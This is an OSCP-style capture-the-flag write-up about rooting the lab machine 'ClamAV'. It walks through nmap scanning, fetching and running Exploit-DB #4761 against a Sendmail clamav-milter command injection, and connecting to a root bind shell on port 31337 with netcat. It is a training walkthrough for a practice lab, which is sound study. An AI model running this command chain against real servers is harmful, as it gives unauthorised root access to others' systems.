---
tags:
  - oscp
  - machine
  - writeup
  - clamav
  - linux
created: 2026-08-02
target_name: ClamAV
target_ip: "192.168.60.42"
os: Linux
difficulty: Easy
user_flag: "N/A (Direct Root Access)"
root_flag: "Captured (proof.txt)"
status: completed
---

# 🖥️ Machine Target: ClamAV (`192.168.60.42`)

> **OS:** `Linux` | **Difficulty:** `Easy` | **Status:** `Completed ✅`

---

## 1. Executive Summary & Compromise Path
- **Initial Access:** Unauthenticated Remote Code Execution (RCE) in Sendmail configured with `clamav-milter` ([Exploit-DB #4761](https://www.exploit-db.com/exploits/4761)).
- **Privilege Escalation:** Direct `root` access granted via bind shell listening on port `31337`.
- **Key Takeaways / Vulnerabilities:**
  1. Service Version Enumeration (Sendmail 8.13.4 & legacy `clamav-milter`).
  2. Input sanitization flaw allowing command injection via email header parameters.
  3. Direct root-level execution when mail filtering daemons run with elevated privileges.

---

## 2. Information Gathering & Port Scanning

### Nmap Scan Commands
```bash
# 1. Quick Initial Scan
sudo nmap -sC -sV -oN nmap_initial.txt 192.168.60.42

# 2. Full Port Scan
sudo nmap -p- --min-rate 1000 -oN nmap_allports.txt 192.168.60.42
```

### Nmap Scan Results
```text
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-02 13:04 +0000
Nmap scan report for 192.168.60.42
Host is up (0.00031s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
25/tcp  open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
80/tcp  open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp open  smux        Linux SNMP multiplexer
445/tcp open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
```

### Discovered Services & Attack Surface
- **Port 22 (SSH):** OpenSSH 3.8.1p1
- **Port 25 (SMTP):** Sendmail 8.13.4 / `clamav-milter`
- **Port 80 (HTTP):** Apache httpd 1.3.33 (Title: Ph33r)
- **Port 139 / 445 (SMB):** Samba smbd 3.0.14a (Guest access enabled)
- **Port 199 (SNMP):** Linux SNMP multiplexer

---

## 3. Vulnerability Assessment & Exploitation

### Initial Footprint & Execution
1. **Exploit Search:**
   ```bash
   searchsploit clamav milter
   searchsploit -m 4761
   ```
2. **Exploit Launch:**
   ```bash
   perl 4761.pl 192.168.60.42
   ```
3. **Connect to Bind Shell (Root Access):**
   ```bash
   nc -nv 192.168.60.42 31337
   ```
4. **Verification & Flag Extraction:**
   ```bash
   whoami # Output: root
   cd /root
   cat proof.txt # SUCCESS: Flag captured!
   ```

---

## 4. Root Access (`proof.txt`) & Verification

- **Compromised Account:** `root` (Direct Root Access)
- **Root Flag:** `proof.txt` captured successfully.
- **Mandatory Flag Proof Screenshot Commands:**
  ```bash
  whoami
  ip a
  cat /root/proof.txt
  ```

---

## 5. External Resources & Writeups

- 📖 **ViperOne Pentest Guide:** [ViperOne PG Practice ClamAV Writeup](https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/clamav)
- 📜 **Exploit-DB Reference:** [Exploit-DB #4761 (Sendmail clamav-milter Remote Root)](https://www.exploit-db.com/exploits/4761)
- 🛡️ **OffSec Proving Grounds:** `ClamAV` Standalone Machine
